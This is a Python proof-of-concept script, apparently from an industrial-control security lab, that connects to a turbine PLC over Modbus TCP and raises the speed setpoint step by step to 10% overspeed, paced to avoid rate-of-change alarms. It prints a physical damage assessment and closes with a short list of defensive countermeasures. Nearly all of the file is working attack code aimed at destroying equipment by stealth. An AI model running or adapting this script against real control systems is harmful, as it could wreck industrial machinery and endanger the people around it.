#!/usr/bin/env python3
"""
Proof of Concept: Turbine Overspeed Attack
Demonstrates gradual manipulation to cause physical damage
WARNING: This is EXTREMELY DESTRUCTIVE - could destroy equipment
"""

import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient


def overspeed_attack(
    target_turbine, start_speed=1500, target_speed=1650, increment=5, delay_seconds=60
):
    """
    Gradually increase turbine speed beyond safe limits
    Slow enough that operators might not notice immediately

    Args:
        target_turbine: IP address of target PLC
        start_speed: Starting speed in RPM (normal operating speed)
        target_speed: Target overspeed in RPM (dangerous level)
        increment: RPM increase per step
        delay_seconds: Seconds to wait between changes (slow = stealthy)
    """
    print("=" * 70)
    print("[!] CRITICAL WARNING: EXTREMELY DESTRUCTIVE OPERATION")
    print("[!] This attack could cause PHYSICAL DAMAGE to equipment")
    print("[!] Real turbines could be DESTROYED by overspeed")
    print("=" * 70 + "\n")

    print(f"[*] Target: {target_turbine}")
    print(f"[*] Current speed: {start_speed} RPM (normal)")
    print(
        f"[*] Target speed: {target_speed} RPM ({((target_speed / start_speed - 1) * 100):.1f}% overspeed)"
    )
    print(f"[*] Increment: {increment} RPM per step")
    print(f"[*] Delay: {delay_seconds} seconds per step")

    steps = (target_speed - start_speed) // increment
    total_time = steps * delay_seconds
    print(f"[*] Total steps: {steps}")
    print(
        f"[*] Estimated duration: {total_time} seconds ({total_time / 60:.1f} minutes)"
    )
    print("[*] Attack profile: SLOW and STEALTHY\n")

    client = ModbusTcpClient(target_turbine, port=10502)
    client.slave_id = 1

    if not client.connect():
        print(f"[!] Connection failed to {target_turbine}")
        return False

    print("[*] Connected to turbine PLC")

    try:
        # Read initial state
        # Simulator addresses: HR[0]=speed_setpoint, IR[0]=current_speed
        current_setpoint = client.read_holding_registers(address=0, count=1)  # type: ignore
        current_speed = client.read_input_registers(address=0, count=1)  # type: ignore

        if not current_setpoint.isError():
            print(f"[*] Initial setpoint: {current_setpoint.registers[0]} RPM")
        if not current_speed.isError():
            print(f"[*] Initial actual speed: {current_speed.registers[0]} RPM")

        print(
            f"\n[*] Beginning gradual overspeed attack at {datetime.now().strftime('%H:%M:%S')}"
        )
        print("-" * 70)

        step = 0
        for speed in range(start_speed, target_speed + 1, increment):
            step += 1

            # Write new speed setpoint
            result = client.write_register(address=0, value=speed)

            if result.isError():
                print(f"[!] Step {step}: Write failed at {speed} RPM")
                continue

            # Read back to verify
            verify = client.read_holding_registers(address=0, count=1)  # type: ignore
            actual_speed = client.read_input_registers(address=0, count=1)  # type: ignore

            timestamp = datetime.now().strftime("%H:%M:%S")
            overspeed_pct = ((speed / start_speed) - 1) * 100

            if not verify.isError():
                print(
                    f"[{timestamp}] Step {step}/{steps}: Setpoint = {verify.registers[0]} RPM "
                    f"(+{overspeed_pct:.1f}%)",
                    end="",
                )

                if not actual_speed.isError():
                    print(f" | Actual = {actual_speed.registers[0]} RPM")
                else:
                    print()

            # Simulate the time delay (1 second for demo, would be 60s in real attack)
            if speed < target_speed:
                # Use shorter delay for demo purposes
                demo_delay = 1 if delay_seconds == 60 else delay_seconds
                if step % 5 == 0:  # Show waiting message every 5 steps
                    print(
                        f"    Waiting {demo_delay}s before next increment (stealthy progression)..."
                    )
                time.sleep(demo_delay)

        print("-" * 70)
        print(f"[*] Attack complete at {datetime.now().strftime('%H:%M:%S')}")

        # Final verification
        final_setpoint = client.read_holding_registers(address=0, count=1)  # type: ignore
        final_speed = client.read_input_registers(address=0, count=1)  # type: ignore

        print("\n[*] FINAL STATE:")
        if not final_setpoint.isError():
            print(f"    Final setpoint: {final_setpoint.registers[0]} RPM")
        if not final_speed.isError():
            print(f"    Final actual speed: {final_speed.registers[0]} RPM")

        print("\n[*] PHYSICAL DAMAGE ASSESSMENT:")
        print(
            f"    • Overspeed: {((target_speed / start_speed - 1) * 100):.1f}% above normal"
        )
        print(
            f"    • Centrifugal forces increased by ~{((target_speed / start_speed) ** 2 - 1) * 100:.0f}%"
        )
        print("    • Potential outcomes:")
        print("      - Blade structural failure")
        print("      - Bearing damage from excessive loads")
        print("      - Gearbox destruction")
        print("      - Generator failure")
        print("      - Catastrophic turbine disintegration")
        print("      - Safety system damage if bypassed")

        print("\n[*] ATTACK CHARACTERISTICS:")
        print("    • Gradual: Changes small enough to avoid immediate alarms")
        print("    • Stealthy: Slow progression appears operational")
        print(f"    • Persistent: Maintained over {total_time / 60:.1f} minutes")
        print("    • Destructive: Physical damage may be irreversible")

        return True

    except Exception as e:
        print(f"\n[!] Error during attack: {e}")
        return False

    finally:
        client.close()
        print("\n[*] Connection closed")


if __name__ == "__main__":
    print("=" * 70)
    print("[*] Proof of Concept: Gradual Overspeed Attack")
    print("[*] Demonstrates slow manipulation to avoid detection")
    print("=" * 70 + "\n")

    print("[!] WARNING: This demonstration shows how attackers can:")
    print("    • Gradually manipulate setpoints to avoid triggering alarms")
    print("    • Cause physical damage through slow, persistent changes")
    print("    • Bypass rate-of-change detection")
    print("    • Destroy expensive industrial equipment\n")

    # Demo with shorter delays for testing
    # In real attack, delay_seconds would be 60 (1 minute per step)
    overspeed_attack(
        target_turbine="127.0.0.1",
        start_speed=1500,
        target_speed=1650,  # 10% overspeed
        increment=5,
        delay_seconds=1,  # 1 second for demo (would be 60 in real attack)
    )

    print("\n" + "=" * 70)
    print("[*] DEFENSIVE COUNTERMEASURES:")
    print("=" * 70)
    print("    • Implement rate-of-change limits (not just absolute limits)")
    print("    • Monitor cumulative operational time in elevated states")
    print("    • Use physics-based anomaly detection")
    print("    • Require multi-factor authorization for setpoint changes")
    print("    • Implement independent safety instrumented systems (SIS)")
    print("    • Log all setpoint modifications with operator attribution")
    print("    • Use hardware-enforced speed governors")
    print("=" * 70)
